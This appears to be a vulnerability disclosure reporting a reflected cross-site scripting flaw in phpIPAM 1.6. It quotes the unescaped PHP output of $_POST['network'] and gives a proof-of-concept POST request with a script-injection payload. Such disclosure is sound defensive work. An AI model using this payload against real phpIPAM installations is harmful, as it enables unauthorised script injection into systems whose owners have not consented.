| Hello,  I would like to report for a xss vulnerability in phpipam-1.6. Analysis The path of the vulnerability: app\admin\firewall-zones\zones-edit-network.php  ``` if ($_POST['action'] != 'add' && $_POST['action'] != 'delete'){exit;} // Line 24 ... foreach ($_POST['network'] as $key => $network) {     print '<input type="hidden" name="network['.$key.']" value="'.$network.'">';		// Line 129 }	  ... ```  We see that there is no check between the input `$_POST["network"]` and the output, We just set `$_POST['action'] = add or delete`, and set `$_POST["network"] = XSSPAYLOAD` Poc `POST /app/admin/firewall-zones/zones-edit-network.php`  Data:  `action=delete&network[0].test=1"><script>alert('xss')</script><` Manual verification [3](https://private-user-images.githubusercontent.com/134520528/347668415-3da52ffb-b2ce-47d3-897f-ec7de5595afd.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTkxNjQsIm5iZiI6MTczNjUxODg2NCwicGF0aCI6Ii8xMzQ1MjA1MjgvMzQ3NjY4NDE1LTNkYTUyZmZiLWIyY2UtNDdkMy04OTdmLWVjN2RlNTU5NWFmZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQxNDIxMDRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1lNzI5ZTBlZTIzODMxODY2NGVmNzAwMDY1YjBmOTA4MjE5YjZkMzNhYTI1NDVlNGQ1Mzg3N2FiNmVkNjg1YzU5JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.DahEPAPksQCw5klRwjVE-EbBeleDmm1VbSWYT5ORbTg)  [4](https://private-user-images.githubusercontent.com/134520528/347668431-e5637302-e70a-4c19-b6e7-715074026b6c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTkxNjQsIm5iZiI6MTczNjUxODg2NCwicGF0aCI6Ii8xMzQ1MjA1MjgvMzQ3NjY4NDMxLWU1NjM3MzAyLWU3MGEtNGMxOS1iNmU3LTcxNTA3NDAyNmI2Yy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQxNDIxMDRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hNTQyODEyNTM0YzAxOTYxODc4MTU5OTFlMWI2Nzk0ZjQ1YTg4NmUzNzM0ZjgyMDkzYjI0YjdhMTBmNWMxMTYxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.VCwCPG9LsNQL4nCgyj_3GcHS3y0gjtPvmM25CyH9hDE) |
